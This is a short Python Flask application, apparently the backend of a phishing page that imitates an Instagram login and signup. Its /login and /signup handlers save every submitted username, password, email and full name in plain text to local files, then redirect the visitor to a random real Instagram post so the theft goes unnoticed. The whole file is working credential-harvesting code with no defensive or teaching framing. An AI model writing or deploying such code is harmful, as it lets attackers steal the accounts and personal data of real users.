from flask import Flask, render_template, request, redirect
import random

app = Flask(__name__)

def guardar_datos(datos, tipo):
    with open(f'{tipo}_data.txt', 'a') as f:
        f.write(str(datos) + '\n')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    guardar_datos({'username': username, 'password': password}, 'login')
    instagram_urls = ["https://www.instagram.com/p/DFHeyY-OhE1/", "https://www.instagram.com/p/DHKiVA2M5OU/", "https://www.instagram.com/p/DGf1McjvlfI/"]
    return redirect(random.choice(instagram_urls))

@app.route('/signup', methods=['POST'])
def signup():
    email = request.form['email']
    fullName = request.form['fullName']
    username = request.form['username']
    password = request.form['password']
    guardar_datos({'email': email, 'fullName': fullName, 'username': username, 'password': password}, 'signup')
    instagram_urls = ["https://www.instagram.com/p/DFHeyY-OhE1/", "https://www.instagram.com/p/DHKiVA2M5OU/", "https://www.instagram.com/p/DGf1McjvlfI/"]
    return redirect(random.choice(instagram_urls))

if __name__ == '__main__':
    app.run(debug=True)